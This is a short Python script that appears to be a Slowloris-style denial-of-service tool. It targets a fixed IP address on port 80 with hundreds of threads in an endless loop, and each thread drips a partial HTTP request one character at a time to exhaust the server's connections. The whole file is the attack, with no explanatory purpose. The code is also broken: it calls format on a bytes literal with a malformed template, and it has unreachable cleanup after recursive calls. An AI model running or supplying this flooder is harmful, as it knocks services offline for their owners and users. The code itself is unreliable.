import socket
import threading
import time

ip = '192.168.0.28'
port = 80

def attack():
    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sockobj.connect((ip, port))
    except:
        attack()
    request='GET / HTTP/1.1'
    for i in request:
    	sockobj.send(b'{}}'.format(i))
    	time.sleep(2)
    attack()


    sockobj.close()




while True:
    for i in range(1, 400):
        t = threading.Thread(target=attack)
        try:
            t.start()
        except:
            pass
